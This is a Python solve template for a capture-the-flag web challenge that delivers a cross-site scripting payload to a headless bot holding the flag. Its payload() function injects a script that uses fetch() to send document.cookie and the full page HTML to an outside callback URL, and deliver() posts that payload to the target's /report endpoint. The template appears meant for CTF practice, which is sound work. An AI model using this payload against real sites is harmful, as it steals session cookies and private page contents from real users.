#!/usr/bin/env ctf-python
"""Solve template: web, for XSS into a headless bot that holds the flag.
Exfiltration needs a public callback URL from `ctf-catch`.
"""
# ctf-catch start              prints an https URL and starts logging
# ctf-catch log                shows what has hit it
# ctf-catch stop
# ctf-chrome-pin 'http://127.0.0.1:8000/payload.html'    test against a local bot first

import pathlib
import sys

# Walk up for lib/ctf.py. Counting parent directories breaks when a level is added.
_here = pathlib.Path(__file__).resolve()
for _p in _here.parents:
    if (_p / "lib" / "ctf.py").is_file():
        sys.path.insert(0, str(_p / "lib"))
        break

import ctf  # noqa: E402
import requests  # noqa: E402

T = ctf.target()
BASE = T.get("url", "http://127.0.0.1:8000").rstrip("/")

# The public callback. Run `ctf-catch start` and export CTF_CATCH.
import os  # noqa: E402

CATCH = os.environ.get("CTF_CATCH", "https://REPLACE.trycloudflare.com")

s = requests.Session()
s.headers["User-Agent"] = "Mozilla/5.0"


def payload() -> str:
    """The injected string."""
    return (
        "<script>"
        f"fetch('{CATCH}/x?c='+encodeURIComponent(document.cookie)"
        "+'&h='+encodeURIComponent(document.documentElement.innerHTML))"
        "</script>"
    )


def deliver(p: str):
    """Send the payload to whatever makes the bot visit it."""
    r = s.post(f"{BASE}/report", data={"url": p}, timeout=20)
    print(r.status_code, r.text[:400])
    return r


def main():
    p = payload()
    print("payload:", p)
    deliver(p)
    print("\nnow read the callback log:  ctf-catch log")
    # If the flag arrives on the callback, read it from the log.
    # ctf.win(open(ctf.artifact('catch.log')).read())


if __name__ == "__main__":
    main()
